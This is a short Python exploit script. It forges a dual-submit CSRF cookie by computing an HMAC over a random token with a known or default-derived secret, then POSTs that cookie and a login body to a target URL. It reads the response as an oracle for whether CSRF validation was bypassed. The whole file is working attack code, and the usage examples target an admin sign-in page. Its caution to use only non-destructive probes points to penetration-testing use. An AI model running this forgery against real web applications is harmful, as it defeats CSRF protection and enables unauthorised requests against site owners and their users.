#!/usr/bin/env python3
"""Forge a dual-submit CSRF cookie (token.hmac) and POST it to a target URL.

Use when an app's Csrf::validate() has a cookie dual-submit fallback whose HMAC
secret is derivable (e.g. config secret absent -> base64_encode(csrf_key), a
known constant). Read the response: a password/auth error instead of a CSRF
error ("请求已失效") means the forgery passed validation (differential oracle).

Usage:
  python3 csrf_forge_probe.py <url> \
      --cookie-name em_csrf_token --field csrf_token \
      --secret-b64 <b64-of-known-secret> \
      --body 'account=admin&password=<REDACTED>'

  # or derive the default-degrade secret from the cookie name:
  python3 csrf_forge_probe.py https://target/admin/sign.php \
      --cookie-name em_csrf_token \
      --body 'account=admin&password=<REDACTED>'

Notes:
  - Use ONLY wrong-password / non-destructive probes against live systems.
  - The csrf field is appended to --body automatically.
  - Cross-site CSRF is still blocked if the cookie is SameSite=Lax; this probe
    proves token forgery, whose real impact is automated attacks without a
    token pre-fetch and any same-site context (subdomains, XSS).
"""
import argparse
import base64
import hashlib
import hmac
import random
import string
import urllib.error
import urllib.parse
import urllib.request


def forge(cookie_name: str, secret: str):
    tok = ''.join(random.choice(string.hexdigits) for _ in range(32)).lower()
    h = hmac.new(secret.encode(), tok.encode(), hashlib.sha256).hexdigest()
    return tok, f'{tok}.{h}'


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('url', help='target URL to POST to')
    ap.add_argument('--cookie-name', default='em_csrf_token', help='CSRF cookie name (default em_csrf_token)')
    ap.add_argument('--field', default='csrf_token', help='POST field for the token (default csrf_token)')
    ap.add_argument('--secret', help='raw HMAC secret string')
    ap.add_argument('--secret-b64', help='base64 string to decode as the raw HMAC secret')
    ap.add_argument('--body', default='', help='other POST body fields (a=b&c=d); csrf field appended')
    args = ap.parse_args()

    if args.secret_b64:
        secret = base64.b64decode(args.secret_b64).decode()
    elif args.secret:
        secret = <REDACTED>
    else:
        # Heuristic for the common degrade pattern: secret = <REDACTED>
        # Override with --secret/--secret-b64 when the app derives differently.
        secret = base64.b64encode(args.cookie_name.encode()).decode()

    tok, cookie = forge(args.cookie_name, secret)
    body = args.body
    if body and not body.endswith('&'):
        body += '&'
    body += urllib.parse.urlencode({args.field: tok})

    req = urllib.request.Request(
        args.url,
        data=body.encode(),
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'{args.cookie_name}={cookie}',
            'User-Agent': 'Mozilla/5.0',
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            print(r.read().decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        print(e.read().decode('utf-8', 'replace'))


if __name__ == '__main__':
    main()
